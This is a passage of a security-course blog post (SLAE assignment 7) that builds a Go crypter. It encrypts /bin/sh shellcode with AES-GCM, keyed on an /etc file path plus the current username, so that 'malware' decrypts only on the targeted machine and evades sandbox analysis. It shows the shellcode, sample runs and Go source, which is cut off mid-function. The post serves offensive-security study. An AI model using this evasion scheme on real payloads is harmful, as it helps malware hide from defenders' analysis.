<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta content="utf-8" http-equiv=encoding><link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin><link rel=stylesheet href=/css/grid.css type=text/css><link rel=stylesheet href=/css/highlight.css type=text/css><link rel=stylesheet href=/css/main.css type=text/css><meta name=apple-mobile-web-app-title content="dubell.io | SLAE 7: Creating your own crypter using golang"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=twitter:site content="@dubs3c"><meta name=twitter:creator content="@dubs3c"><meta property="og:title" content="dubell.io | SLAE 7: Creating your own crypter using golang"><meta name=twitter:title content="dubell.io | SLAE 7: Creating your own crypter using golang"><meta itemprop=name content="dubell.io | SLAE 7: Creating your own crypter using golang"><meta name=application-name content="dubell.io | SLAE 7: Creating your own crypter using golang"><meta property="og:site_name" content="dubell.io"><meta property="og:article:published_time" content="2020-01-27T13:33:37Z"><meta property="article:published_time" content="2020-01-27T13:33:37Z"><base href=/www/slae-7-creating_custom_crypter/><link rel=canonical href=/www/slae-7-creating_custom_crypter/ itemprop=url><meta name=url content="/www/slae-7-creating_custom_crypter/"><meta name=twitter:url content="/www/slae-7-creating_custom_crypter/"><meta property="og:url" content="/www/slae-7-creating_custom_crypter/"><meta property="og:article:author" content="Dubs3c"><meta property="article:author" content="Dubs3c"><meta name=author content="Dubs3c"><meta name=description content="Custom shellcode crypter in golang"><meta itemprop=description content="Custom shellcode crypter in golang"><meta property="og:description" content="Custom shellcode crypter in golang"><meta name=twitter:description content="Custom shellcode crypter in golang"><meta itemprop=image content="/img/hacker2.jpg"><meta property="og:image" content="/img/hacker2.jpg"><meta name=twitter:image content="/img/hacker2.jpg"><meta name=twitter:image:src content="/img/hacker2.jpg"><meta property="og:updated_time" content="2020-01-27T13:33:37Z"><link rel=sitemap type=application/xml title=Sitemap href=sitemap.xml><title>dubell.io | SLAE 7: Creating your own crypter using golang</title></head><body><div id=particles-js></div><main><div class=row><header class="col center"><a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a></div></div><div class=row><div class="col center"><nav><fieldset><legend>n4vig4ti0n</legend><ul><li><a href=/>/etc/motd</a></li><li><a href=/www/>/var/www</a></li><li><a href=/mnt/>/mnt</a></li><li><a href=/usr/>/usr</a></li></ul></fieldset></nav></div></div><div class=content><article><h1>SLAE 7: Creating your own crypter using golang</h1><br><p class=small style=color:#999><a href=/categories/programming>Programming</a> / January 27, 2020 â€¢ 4 min read</p><p class=small><strong>Tags:</strong> <a href=/tags/slae class=tag>slae</a> <a href=/tags/shellcoding class=tag>shellcoding</a></p><br><p>In this article, we will build a simple crypter for encrypting and decrypting shellcode. I chose to implement the crypter in Go using environmental keys.</p><p>I will not spend time implementing a fancy shellcode execution method in this article, only encryption and decryption methods are in scope for now.</p><h2 id=encryption>Encryption</h2><p>The encryption/decryption process is using AES GCM and a specific file in <code>/etc/</code> concatenated with the current user logged in as the key. This is called <em>Environmental Keying</em>, meaning you use specific values found in the victim&rsquo;s environment such as files, hostname or users. The purpose of this is to make sure that your malware <strong>only</strong> executes in a specific environment. This means the attacker needs to know some details about the environment before encrypting any shellcode.</p><p>Analysing the shellcode will be difficult because the correct environment values are needed in order to successfully decrypt the shellcode. Relying on dynamic analysis in a sandbox is futile because of this reason.</p><p>The specific values that I have chosen for the key is the file path <code>/etc/vmware-tools/scripts/vmware/network</code> and current logged in user. The final key will look like this: <code>/etc/vmware-tools/scripts/vmware/networkdubs3c</code>.</p><p>The following example encrypts a simple shellcode that executes <code>/bin/sh</code>:</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_7$ go run main.go -e -s &#34;\xfc\xbb\x1b\x91\xcd\xc8\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x2a\x43\x9f\xa0\x22\x4c\x53\x59\xd2\xbd\xbc\xfb\x4b\x4b\x21\xca\x42\x7a\x66\x9d\x5f\xb0\xe6\xde\x5f\x4a\xe7\xde&#34;
[+] Your encrypted shellcode: 5af9fb00a2147e12ba73c2686b1b25fac3f441ffcb6974b00ec7413208dc749dae128faf67a5db80fe868dc2386e30546409503beb9ea6973441dc0ace3b35563550e3041fdde2c234b7dbd36ce74f1653ac08ec3be1f6fac3dd6fc34b378477bf6a5acf7800d01ee1c9280d8f6e2ccb8b13f517e790cc6d6623df9b1ced1dc1ebd8df2caca412f6f9d8233bd233fd6c590b12211f0706fc18dca864e97908df4eb638c8b223afc57d59714db119a0075dc935a65a38b4fe175fc15ad2b03125303b98c991ac01238f61c10f444bd85ad081fe2d097f816345e2ab98436cae10033c1cd870502608eac6a3149688b992
dubs3c@slae:~/SLAE/EXAM/github/assignment_7$
</code></pre><h2 id=decryption>Decryption</h2><p>The decryption function will loop over all files and folders in <code>/etc/</code> and try each file path as the key together with the current username. When the correct key is found, the shellcode is decrypted.</p><p>Decrypting shellcode:</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_7$ go run main.go -d -s &#34;5af9fb00a2147e12ba73c2686b1b25fac3f441ffcb6974b00ec7413208dc749dae128faf67a5db80fe868dc2386e30546409503beb9ea6973441dc0ace3b35563550e3041fdde2c234b7dbd36ce74f1653ac08ec3be1f6fac3dd6fc34b378477bf6a5acf7800d01ee1c9280d8f6e2ccb8b13f517e790cc6d6623df9b1ced1dc1ebd8df2caca412f6f9d8233bd233fd6c590b12211f0706fc18dca864e97908df4eb638c8b223afc57d59714db119a0075dc935a65a38b4fe175fc15ad2b03125303b98c991ac01238f61c10f444bd85ad081fe2d097f816345e2ab98436cae10033c1cd870502608eac6a3149688b992&#34;
[+] Decrypted shellcode: \xfc\xbb\x1b\x91\xcd\xc8\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x2a\x43\x9f\xa0\x22\x4c\x53\x59\xd2\xbd\xbc\xfb\x4b\x4b\x21\xca\x42\x7a\x66\x9d\x5f\xb0\xe6\xde\x5f\x4a\xe7\xde
dubs3c@slae:~/SLAE/EXAM/github/assignment_7$
</code></pre><h2 id=final-code>Final code</h2><p>Below is the final program for encrypting/decrypting shellcode.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;crypto/aes&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;crypto/cipher&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;crypto/rand&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;crypto/sha256&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;encoding/hex&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;flag&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;fmt&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;io&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;os&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;os/user&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;path/filepath&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>type</span> <span class=nx>cliOptions</span> <span class=kd>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>encrypt</span>   <span class=kt>bool</span>
</span></span><span class=line><span class=cl>    <span class=nx>decrypt</span>   <span class=kt>bool</span>
</span></span><span class=line><span class=cl>    <span class=nx>shellcode</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>processArgs</span><span class=p>()</span> <span class=nx>cliOptions</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>opts</span> <span class=o>:=</span> <span class=nx>cliOptions</span><span class=p>{}</span>
</span></span><span class=line><span class=cl>    <span class=nx>flag</span><span class=p>.</span><span class=nf>BoolVar</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>opts</span><span class=p>.</span><span class=nx>decrypt</span><span class=p>,</span> <span class=s>&#34;decrypt&#34;</span><span class=p>,</span> <span class=kc>false</span><span class=p>,</span> <span class=s>&#34;Decrypt your shellcode&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>flag</span><span class=p>.</span><span class=nf>BoolVar</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>opts</span><span class=p>.</span><span class=nx>decrypt</span><span class=p>,</span> <span class=s>&#34;d&#34;</span><span class=p>,</span> <span class=kc>false</span><span class=p>,</span> <span class=s>&#34;Decrypt your shellcode&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>flag</span><span class=p>.</span><span class=nf>BoolVar</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>opts</span><span class=p>.</span><span class=nx>encrypt</span><span class=p>,</span> <span class=s>&#34;encrypt&#34;</span><span class=p>,</span> <span class=kc>false</span><span class=p>,</span> <span class=s>&#34;Encrypt your shellcode&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>flag</span><span class=p>.</span><span class=nf>BoolVar</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>opts</span><span class=p>.</span><span class=nx>encrypt</span><span class=p>,</span> <span class=s>&#34;e&#34;</span><span class=p>,</span> <span class=kc>false</span><span class=p>,</span> <span class=s>&#34;Encrypt your shellcode&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>flag</span><span class=p>.</span><span class=nf>StringVar</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>opts</span><span class=p>.</span><span class=nx>shellcode</span><span class=p>,</span> <span class=s>&#34;shellcode&#34;</span><span class=p>,</span> <span class=s>&#34;&#34;</span><span class=p>,</span> <span class=s>&#34;Your shellcode&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>flag</span><span class=p>.</span><span class=nf>StringVar</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>opts</span><span class=p>.</span><span class=nx>shellcode</span><span class=p>,</span> <span class=s>&#34;s&#34;</span><span class=p>,</span> <span class=s>&#34;&#34;</span><span class=p>,</span> <span class=s>&#34;Your shellcode&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>flag</span><span class=p>.</span><span class=nf>Parse</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>opts</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>init</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>flag</span><span class=p>.</span><span class=nx>Usage</span> <span class=p>=</span> <span class=kd>func</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>h</span> <span class=o>:=</span> <span class=s>&#34;\nEncrypt your shellcode! Very nice! Made by @dubs3c.\n\n&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>h</span> <span class=o>+=</span> <span class=s>&#34;Usage:\n&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nx>h</span> <span class=o>+=</span> <span class=s>&#34;  cyrptoBoot [shellcode] [options]\n\n&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>h</span> <span class=o>+=</span> <span class=s>&#34;Options:\n&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nx>h</span> <span class=o>+=</span> <span class=s>&#34;  -e,  --encrypt      Encrypt shellcode\n&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nx>h</span> <span class=o>+=</span> <span class=s>&#34;  -d,  --decrypt      Decrypt shellcode\n&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nx>h</span> <span class=o>+=</span> <span class=s>&#34;  -s,  --shellcode    Shellcode\n&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nx>h</span> <span class=o>+=</span> <span class=s>&#34;  -v,  --version      Show version\n&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>h</span> <span class=o>+=</span> <span class=s>&#34;\nExamples:\n&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nx>h</span> <span class=o>+=</span> <span class=s>&#34;  cryptoBoot -e -s \&#34;&lt;shellcode&gt;\&#34;\n&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nx>h</span> <span class=o>+=</span> <span class=s>&#34;  cryptoBoot -d -s \&#34;&lt;shellcode&gt;\&#34;\n&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>fmt</span><span class=p>.</span><span class=nf>Fprintf</span><span class=p>(</span><span class=nx>os</span><span class=p>.</span><span class=nx>Stderr</span><span class=p>,</span> <span class=nx>h</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>encrypt</span><span class=p>(</span><span class=nx>shellcode</span> <span class=kt>string</span><span class=p>,</span> <span class=nx>envKey</span> <span class=p>[]</span><span class=kt>byte</span><span class=p>)</span> <span class=p>(</span><span class=nx>encryptedShellcode</span> <span class=p>[]</span><span class=kt>byte</span><span class=p>,</span> <span class=nx>err</span> <span class=kt>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>plaintext</span> <span class=o>:=</span> <span class=p>[]</span><span class=nb>byte</span><span class=p>(</span><span class=nx>shellcode</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>block</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>aes</span><span class=p>.</span><span class=nf>NewCipher</span><span class=p>(</span><span class=nx>envKey</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>panic</span><span class=p>(</span><span class=nx>err</span><span class=p>.</span><span class=nf>Error</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Never use more than 2^32 random nonces with a given key because of the risk of a repeat.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>nonce</span> <span class=o>:=</span> <span class=nb>make</span><span class=p>([]</span><span class=kt>byte</span><span class=p>,</span> <span class=mi>12</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>io</span><span class=p>.</span><span class=nf>ReadFull</span><span class=p>(</span><span class=nx>rand</span><span class=p>.</span><span class=nx>Reader</span><span class=p>,</span> <span class=nx>nonce</span><span class=p>);</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>panic</span><span class=p>(</span><span class=nx>err</span><span class=p>.</span><span class=nf>Error</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>aesgcm</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>cipher</span><span class=p>.</span><span class=nf>NewGCM</span><span class=p>(</span><span class=nx>block</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>panic</span><span class=p>(</span><span class=nx>err</span><span class=p>.</span><span class=nf>Error</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>ciphertext</span> <span class=o>:=</span> <span class=nx>aesgcm</span><span class=p>.</span><span class=nf>Seal</span><span class=p>(</span><span class=kc>nil</span><span class=p>,</span> <span class=nx>nonce</span><span class=p>,</span> <span class=nx>plaintext</span><span class=p>,</span> <span class=kc>nil</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>ciphertextWithNonce</span> <span class=o>:=</span> <span class=nb>append</span><span class=p>(</span><span class=nx>nonce</span><span class=p>,</span> <span class=nx>ciphertext</span><span class=o>...</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>encodedCiphertext</span> <span class=o>:=</span> <span class=nb>make</span><span class=p>([]</span><span class=kt>byte</span><span class=p>,</span> <span class=nx>hex</span><span class=p>.</span><span class=nf>EncodedLen</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=nx>ciphertextWithNonce</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=nx>hex</span><span class=p>.</span><span class=nf>Encode</span><span class=p>(</span><span class=nx>encodedCiphertext</span><span class=p>,</span> <span class=nx>ciphertextWithNonce</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>encodedCiphertext</span><span class=p>,</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>decrypt</span><span class=p>(</span><span class=nx>ciphertext</span> <span class=kt>string</span><span class=p>,</span> <span class=nx>envKey</span> <span class=p>[]</span><span class=kt>byte</span><span class=p>)</span> <span class=p>(</span><span class=nx>plaintext</span> <span class=p>[]</span><span class=kt>byte</span><span class=p>,</span> <span class=nx>err</span> <span class=kt>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>ciphertxt</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>hex</span><span class=p>.</span><span class=nf>DecodeString</span><span class=p>(</span><span class=nx>ciphertext</span><span class=p>[</span><span class=mi>24</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>    <span class=nx>nonce</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>hex</span><span class=p>.</span><span class=nf>DecodeString</span><span class=p>(</span><span class=nx>ciphertext</span><span class=p>[:</span><span class=mi>24</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>block</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>aes</span><span class=p>.</span><span class=nf>NewCipher</span><span class=p>(</span><span class=nx>envKey</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>[]</span><span class=kt>byte</span><span class=p>{},</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>aesgcm</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>cipher</span><span class=p>.</span><span class=nf>NewGCM</span><span class=p>(</span><span class=nx>block</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>[]</span><span class=kt>byte</span><span class=p>{},</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>plaintxt</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>aesgcm</span><span class=p>.</span><span class=nf>Open</span><span class=p>(</span><span class=kc>nil</span><span class=p>,</span> <span class=nx>nonce</span><span class=p>,</span> <span class=nx>ciphertxt</span><span class=p>,</span> <span class=kc>nil</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>[]</span><span class=kt>byte</span><span class=p>{},</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>plaintxt</span><span class=p>,</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=nx>os</span><span class=p>.</span><span class=nx>Args</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=mi>1</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>flag</span><span class=p>.</span><span class=nf>Usage</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=nx>os</span><span class=p>.</span><span class=nf>Exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>opts</span> <span class=o>:=</span> <span class=nf>processArgs</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>currentUser</span> <span class=o>:=</span> <span class=o>&amp;</span><span class=nx>user</span><span class=p>.</span><span class=nx>User</span><span class=p>{}</span>
</span></span><span class=line><span class=cl>    <span class=nx>currentUser</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>user</span><span class=p>.</span><span class=nf>Current</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nx>envPath</span> <span class=o>:=</span> <span class=s>&#34;/etc/vmware-tools/scripts/vmware/network&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nx>envKey</span> <span class=o>:=</span> <span class=nx>sha256</span><span class=p>.</span><span class=nf>Sum256</span><span class=p>([]</span><span class=nb>byte</span><span class=p>(</span><span class=nx>envPath</span> <span class=o>+</span> <span class=nx>currentUser</span><span class=p>.</span><span class=nx>Username</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>opts</span><span class=p>.</span><span class=nx>encrypt</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>opts</span><span class=p>.</span><span class=nx>shellcode</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;[-] Please specify your shellcode&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nx>os</span><span class=p>.</span><span class=nf>Exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>ciphertext</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nf>encrypt</span><span class=p>(</span><span class=nx>opts</span><span class=p>.</span><span class=nx>shellcode</span><span class=p>,</span> <span class=nx>envKey</span><span class=p>[:])</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;[-] Something went wrong encrypting your shellcode. Error: &#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nx>os</span><span class=p>.</span><span class=nf>Exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>fmt</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;[+] Your encrypted shellcode: %s\n&#34;</span><span class=p>,</span> <span class=nx>ciphertext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>opts</span><span class=p>.</span><span class=nx>decrypt</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>opts</span><span class=p>.</span><span class=nx>shellcode</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
